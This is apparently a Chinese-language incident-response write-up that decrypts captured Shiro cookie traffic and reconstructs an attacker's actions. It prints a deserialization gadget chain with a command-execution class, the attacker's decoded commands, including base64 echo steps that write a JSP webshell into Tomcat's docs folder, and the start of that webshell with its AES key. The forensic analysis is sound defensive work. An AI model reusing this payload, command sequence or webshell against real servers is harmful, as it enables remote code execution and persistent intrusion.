<a name="IDRct"></a>
## shiro流量解密
shiro的cookie值会很长，一般分析会直接筛查Lenght长度<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1657036456961-eb4c0a4e-0aaa-4d49-b139-58d277ef1375.png#clientId=ue807cd5d-c14f-4&from=paste&height=775&id=u4fc0c5b9&originHeight=969&originWidth=1875&originalType=binary&ratio=1&rotation=0&showTitle=false&size=127867&status=done&style=none&taskId=ud8963ba6-dc1d-4817-a218-c04b8d4f145&title=&width=1500)

shiro的cookie主要是AES→base64双层加密，用下面这个工具，就可以直接解出来cookie的内容<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1660708707343-7a8bc9ae-07c4-4e1e-b6ea-fcea035faa20.png#clientId=u3136d7dc-24ba-4&from=paste&height=646&id=u742674bb&originHeight=808&originWidth=1098&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72857&status=done&style=none&taskId=uc7813e25-30ea-4503-bf61-7566fd72161&title=&width=878.4)<br />解密内容如下
```html
鑬{�嗴))�?/I垃�sr2sun.reflect.annotation.AnnotationInvocationHandlerU术藒�LmemberValuestLjava/util/Map;LtypetLjava/lang/Class;xps}java.util.Mapxrjava.lang.reflect.Proxy�'� �C�Lht%Ljava/lang/reflect/InvocationHandler;xpsq~sr*org.apache.commons.collections.map.LazyMapn鍞倿y�Lfactoryt,Lorg/apache/commons/collections/Transformer;xpsr:org.apache.commons.collections.functors.ChainedTransformer0菞�(z�[iTransformerst-[Lorg/apache/commons/collections/Transformer;xpur-[Lorg.apache.commons.collections.Transformer;絍*褙4�xpsr;org.apache.commons.collections.functors.ConstantTransformerXv�A睌L	iConstanttLjava/lang/Object;xpvr7com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilterxpsr>org.apache.commons.collections.functors.InstantiateTransformer4嬼�;[iArgst[Ljava/lang/Object;[iParamTypest[Ljava/lang/Class;xpur[Ljava.lang.Object;愇X�s)lxpsr:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl	WO羘3I_indentNumberI_transletIndex[
_bytecodest[[B[_classq~L_nametLjava/lang/String;L_outputPropertiestLjava/util/Properties;xp����ur[[BK�gg�7xpur[B�T�xp	问�3�x/Test559794544911020java/lang/Object
SourceFileTest559794544911020.java<init>()V
	<org/springframework/web/context/request/RequestContextHoldergetRequestAttributes=()Lorg/springframework/web/context/request/RequestAttributes;
@org/springframework/web/context/request/ServletRequestAttributes
getRequest)()Ljavax/servlet/http/HttpServletRequest;
getResponse*()Ljavax/servlet/http/HttpServletResponse;
techo%javax/servlet/http/HttpServletRequest	getHeader&(Ljava/lang/String;)Ljava/lang/String; !java/lang/String#isEmpty()Z%&
$'&javax/servlet/http/HttpServletResponse)	addHeader'(Ljava/lang/String;Ljava/lang/String;)V+,*-javax/servlet/ServletResponse/	getWriter()Ljava/io/PrintWriter;1203java/io/PrintWriter5flush7
68close:
6;c=org/apache/shiro/codec/Base64?decodeToStringA 
@Bos.nameDjava/lang/SystemFgetPropertyH 
GItoLowerCase()Ljava/lang/String;KL
$MwindowsOcontains(Ljava/lang/CharSequence;)ZQR
$Scmd.exeU/cW/bin/shY-c[java/util/Scanner]java/lang/ProcessBuilder_([Ljava/lang/String;)Va
`bstart()Ljava/lang/Process;de
`fjava/lang/ProcesshgetInputStream()Ljava/io/InputStream;jk
il(Ljava/io/InputStream;)Vn
^o\AquseDelimiter'(Ljava/lang/String;)Ljava/util/Scanner;st
^unextwL
^xgetBytes()[Bz{
$|~encodeToString([B)Ljava/lang/String;��
@�java/lang/StringBuffer�
�	$$$�append,(Ljava/lang/String;)Ljava/lang/StringBuffer;��
��toString�L
��write(Ljava/lang/String;)V��
6�java/lang/Exception�java/lang/Throwable�getStackTrace ()[Ljava/lang/StackTraceElement;��
��Code
Exceptions9org/springframework/web/context/request/RequestAttributes�[Ljava/lang/String;�StackMapTable@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet�
�	!��s*�ジL+��M+��N,�":��(��-�.-�4�9-�4�<,>�":��(����C:E�J�NP�T��$YVSYXSYS��$YZSY\SYS:�^Y�`Y�c�g�m�pr�v�y�}::	��:	-�4�匶��埗�	��埗尪彾�-�4�9-�4�<�:

�沇����<
�0�*$�$�,$R→c��
��ptapwxur[Ljava.lang.Class;�桩送Z�xpvrjavax.xml.transform.Templatesxpsrjava.util.HashMap诹�`�F
loadFactorI	thresholdxp?@wxxvrjava.lang.Overridexpq~-
```
重点关注的地方<br />c=org/apache/shiro/codec/Base64?decodeToStringA              c进行base64加密的密文传参<br />$Scmd.exeU/cW/bin/shY-c[java/util/Scanner]java/lang/ProcessBuilder_([Ljava/lang/String;)Va<br />`bstart()Ljava/lang/Process;de       ProcessBuilder去进行命令执行

通过分析筛查 c: 的传参 搜索黑客攻击都做了什么操作<br />http && http contains "/admin/" && ip.src ==10.7.7.7<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1660711759580-3b921c10-1563-4c5a-aa28-46fbcf85c20e.png#clientId=uc908d7e8-af31-4&from=paste&height=760&id=ud268d236&originHeight=950&originWidth=1591&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125779&status=done&style=none&taskId=u67423caa-6332-4a09-bf33-1663df8ac9a&title=&width=1272.8)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1660712066749-3ae5e35c-a880-4dd2-ad9a-1261ccbb61aa.png#clientId=uc908d7e8-af31-4&from=paste&height=497&id=ua848ae85&originHeight=621&originWidth=1081&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58187&status=done&style=none&taskId=udb423d32-6c3e-49a2-acf7-90f17b9e5a3&title=&width=864.8)

把c： 所有命令执行base64加密的值复制出来
```html
c: d2hvYW1p
c: cHMgLWF1eCB8IGdyZXAgdG9tY2F0
c: bHMgLWFsIC9yb290L2FwYWNoZS10b21jYXQtOC41LjY2
c: bHMgLWFsIC9yb290L2FwYWNoZS10b21jYXQtOC41LjY2L3dlYmFwcHMvZG9jcw==
c: ZWNobyAxMjMgPiAgL3Jvb3QvYXBhY2hlLXRvbWNhdC04LjUuNjYvd2ViYXBwcy9kb2NzLzEudHh0
c: ZWNobyBQQ1ZBY0dGblpTQnBiWEJ2Y25ROUltcGhkbUV1ZFhScGJDNHFMR3BoZG1GNExtTnllWEIwYnk0cUxHcGhkbUY0TG1OeWVYQjBieTV6Y0dWakxpb2lKVDQ4SlNGamJHRnpjeUJWSUdWNGRHVnVaSE1nUTJ4aGMzTk1iMkZrWlhKN1ZTaERiR0Z6YzB4dllXUmxjaUJqS1h0emRYQmxjaWhqS1R0OWNIVmliR2xqSUVOc1lYTnpJR2NvWW5sMFpTQmJYV0lwZTNKbGRIVnliaUJ6ZFhCbGNpNWtaV1pwYm1WRGJHRnpjeWhpTERBc1lpNXNaVzVuZEdncE8zMTlKVDQ4SldsbUlDaHlaWEYxWlhOMExtZGxkRTFsZEdodlpDZ3BMbVZ4ZFdGc2N5Z2lVRTlUVkNJcEtYdFRkSEpwYm1jZ2F6MGlNakF5WTJJNU5qSmhZelU1TURjMVlpSTdMeXJvcjZYbHI0YnBrcVhrdUxyb3Y1N21qcVhscjRibm9JRXpNdVM5alcxa05lV0F2T2VhaE9XSmpURTI1TDJONzd5TTZidVk2SzZrNkwrZTVvNmw1YStHNTZDQk1USXpLaTl6WlhOemFXOXVMbkIxZEZaaGJIVmxLQ0oxSWl4cktUcz0gPiAgL3Jvb3QvYXBhY2hlLXRvbWNhdC04LjUuNjYvd2ViYXBwcy9kb2NzLzEuanNw

c: ZWNobyBRMmx3YUdWeUlHTTlRMmx3YUdWeUxtZGxkRWx1YzNSaGJtTmxLQ0pCUlZNaUtUdGpMbWx1YVhRb01peHVaWGNnVTJWamNtVjBTMlY1VTNCbFl5aHJMbWRsZEVKNWRHVnpLQ2tzSWtGRlV5SXBLVHR1WlhjZ1ZTaDBhR2x6TG1kbGRFTnNZWE56S0NrdVoyVjBRMnhoYzNOTWIyRmtaWElvS1NrdVp5aGpMbVJ2Um1sdVlXd29ibVYzSUhOMWJpNXRhWE5qTGtKQlUwVTJORVJsWTI5a1pYSW9LUzVrWldOdlpHVkNkV1ptWlhJb2NtVnhkV1Z6ZEM1blpYUlNaV0ZrWlhJb0tTNXlaV0ZrVEdsdVpTZ3BLU2twTG01bGQwbHVjM1JoYm1ObEtDa3VaWEYxWVd4ektIQmhaMlZEYjI1MFpYaDBLVHQ5SlQ0PSA+PiAgL3Jvb3QvYXBhY2hlLXRvbWNhdC04LjUuNjYvd2ViYXBwcy9kb2NzLzEuanNw

c: ZWNobyAgL3Jvb3QvYXBhY2hlLXRvbWNhdC04LjUuNjYvd2ViYXBwcy9kb2NzLzEuanNwIHwgYmFzZTY0IC1kID4gL3Jvb3QvYXBhY2hlLXRvbWNhdC04LjUuNjYvd2ViYXBwcy9kb2NzLzIuanNw

c: ZWNobyAgIFBDVkFjR0ZuWlNCcGJYQnZjblE5SW1waGRtRXVkWFJwYkM0cUxHcGhkbUY0TG1OeWVYQjBieTRxTEdwaGRtRjRMbU55ZVhCMGJ5NXpjR1ZqTGlvaUpUNDhKU0ZqYkdGemN5QlZJR1Y0ZEdWdVpITWdRMnhoYzNOTWIyRmtaWEo3VlNoRGJHRnpjMHh2WVdSbGNpQmpLWHR6ZFhCbGNpaGpLVHQ5Y0hWaWJHbGpJRU5zWVhOeklHY29ZbmwwWlNCYlhXSXBlM0psZEhWeWJpQnpkWEJsY2k1a1pXWnBibVZEYkdGemN5aGlMREFzWWk1c1pXNW5kR2dwTzMxOUpUNDhKV2xtSUNoeVpYRjFaWE4wTG1kbGRFMWxkR2h2WkNncExtVnhkV0ZzY3lnaVVFOVRWQ0lwS1h0VGRISnBibWNnYXowaU1qQXlZMkk1TmpKaFl6VTVNRGMxWWlJN0x5cm9yNlhscjRicGtxWGt1THJvdjU3bWpxWGxyNGJub0lFek11UzlqVzFrTmVXQXZPZWFoT1dKalRFMjVMMk43N3lNNmJ1WTZLNms2TCtlNW82bDVhK0c1NkNCTVRJektpOXpaWE56YVc5dUxuQjFkRlpoYkhWbEtDSjFJaXhyS1RzPSAgPiAvcm9vdC9hcGFjaGUtdG9tY2F0LTguNS42Ni93ZWJhcHBzL2RvY3MvMS50eHQ=

c: ZWNobyAgIFEybHdhR1Z5SUdNOVEybHdhR1Z5TG1kbGRFbHVjM1JoYm1ObEtDSkJSVk1pS1R0akxtbHVhWFFvTWl4dVpYY2dVMlZqY21WMFMyVjVVM0JsWXlockxtZGxkRUo1ZEdWektDa3NJa0ZGVXlJcEtUdHVaWGNnVlNoMGFHbHpMbWRsZEVOc1lYTnpLQ2t1WjJWMFEyeGhjM05NYjJGa1pYSW9LU2t1WnloakxtUnZSbWx1WVd3b2JtVjNJSE4xYmk1dGFYTmpMa0pCVTBVMk5FUmxZMjlrWlhJb0tTNWtaV052WkdWQ2RXWm1aWElvY21WeGRXVnpkQzVuWlhSU1pXRmtaWElvS1M1eVpXRmtUR2x1WlNncEtTa3BMbTVsZDBsdWMzUmhibU5sS0NrdVpYRjFZV3h6S0hCaFoyVkRiMjUwWlhoMEtUdDlKVDQ9ID4+IC9yb290L2FwYWNoZS10b21jYXQtOC41LjY2L3dlYmFwcHMvZG9jcy8xLnR4dA==

c: ZWNobyAgIC9yb290L2FwYWNoZS10b21jYXQtOC41LjY2L3dlYmFwcHMvZG9jcy8xLnR4dCB8IGJhc2U2NCAtZCA+ICAvcm9vdC9hcGFjaGUtdG9tY2F0LTguNS42Ni93ZWJhcHBzL2RvY3MvMy5qc3A=

c: ZWNobyAgL3Jvb3QvYXBhY2hlLXRvbWNhdC04LjUuNjYvd2ViYXBwcy9kb2NzLzMuanNw

c: Y2F0ICAgL3Jvb3QvYXBhY2hlLXRvbWNhdC04LjUuNjYvd2ViYXBwcy9kb2NzLzEudHh0IHwgYmFzZTY0IC1kID4gL3Jvb3QvYXBhY2hlLXRvbWNhdC04LjUuNjYvd2ViYXBwcy9kb2NzLzMuanNw

```

直接批量解密 可以发现攻击者命令执行的操作，就是在docs/3.jsp写入webshell
```html
c: whoami
c: ps -aux | grep tomcat
c: ls -al /root/apache-tomcat-8.5.66
c: ls -al /root/apache-tomcat-8.5.66/webapps/docs
c: echo 123 >  /root/apache-tomcat-8.5.66/webapps/docs/1.txt
c: echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iMjAyY2I5NjJhYzU5MDc1YiI7Lyror6Xlr4bpkqXkuLrov57mjqXlr4bnoIEzMuS9jW1kNeWAvOeahOWJjTE25L2N77yM6buY6K6k6L+e5o6l5a+G56CBMTIzKi9zZXNzaW9uLnB1dFZhbHVlKCJ1IixrKTs= >  /root/apache-tomcat-8.5.66/webapps/docs/1.jsp

c: echo Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= >>  /root/apache-tomcat-8.5.66/webapps/docs/1.jsp

c: echo  /root/apache-tomcat-8.5.66/webapps/docs/1.jsp | base64 -d > /root/apache-tomcat-8.5.66/webapps/docs/2.jsp

c: echo   PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iMjAyY2I5NjJhYzU5MDc1YiI7Lyror6Xlr4bpkqXkuLrov57mjqXlr4bnoIEzMuS9jW1kNeWAvOeahOWJjTE25L2N77yM6buY6K6k6L+e5o6l5a+G56CBMTIzKi9zZXNzaW9uLnB1dFZhbHVlKCJ1IixrKTs=  > /root/apache-tomcat-8.5.66/webapps/docs/1.txt

c: echo   Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= >> /root/apache-tomcat-8.5.66/webapps/docs/1.txt

c: echo   /root/apache-tomcat-8.5.66/webapps/docs/1.txt | base64 -d >  /root/apache-tomcat-8.5.66/webapps/docs/3.jsp

c: echo  /root/apache-tomcat-8.5.66/webapps/docs/3.jsp

c: cat   /root/apache-tomcat-8.5.66/webapps/docs/1.txt | base64 -d > /root/apache-tomcat-8.5.66/webapps/docs/3.jsp

```
其中3.jsp解码后，可以看出来是冰歇马，加密的key 202cb962ac59075b
```html
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="202cb962ac59075b";session.putValue("u",k);
```
<a name="Q24bd"></a>
## 冰歇流量解密
对3.jsp进行流量筛选，对post内容进行流量分析<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1660724031219-aa4cc4cd-3e8a-479f-91e7-48d892c5f32b.png#clientId=u8f690ef0-078d-4&from=paste&height=702&id=ub261a87f&originHeight=878&originWidth=1834&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98327&status=done&style=none&taskId=u7ce5aa54-ad6e-4046-a6e5-9463897f817&title=&width=1467.2)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1660725586871-3df1ac81-579d-4fc6-b0b9-d8a078787af4.png#clientId=u8f690ef0-078d-4&from=paste&height=642&id=u1252b3a8&originHeight=803&originWidth=860&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115462&status=done&style=none&taskId=ued8cb9fd-3d88-4af9-8799-b991505d236&title=&width=688)<br />用的是这个工具<br />[https://github.com/minhangxiaohui/DecodeSomeJSPWebshell](https://github.com/minhangxiaohui/DecodeSomeJSPWebshell)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1660724060154-f0a443f0-df3b-413c-a801-c9f3522535ff.png#clientId=u8f690ef0-078d-4&from=paste&height=800&id=u403a64d2&originHeight=1000&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=192077&status=done&style=none&taskId=uc612b5d2-b4f1-46dc-9b9f-b40506e1fef&title=&width=640)<br />把class文件拉进idea或者jadx反编译，可以直接看到java代码，就可以分析出来攻击者通过webshell做了什么操作从而进行应急排查。<br />![d81b5ba53dc93e0078a46029447a032.jpg](https://cdn.nlark.com/yuque/0/2022/jpeg/1345801/1660725458921-e77d95dc-4cf1-4891-b8c5-cb30dabb7f58.jpeg#clientId=u8f690ef0-078d-4&from=paste&height=599&id=ufd294c65&originHeight=749&originWidth=1344&originalType=binary&ratio=1&rotation=0&showTitle=false&size=153609&status=done&style=none&taskId=u9e4f04ac-9da9-4b5e-a26b-bab66b24b30&title=&width=1075.2)
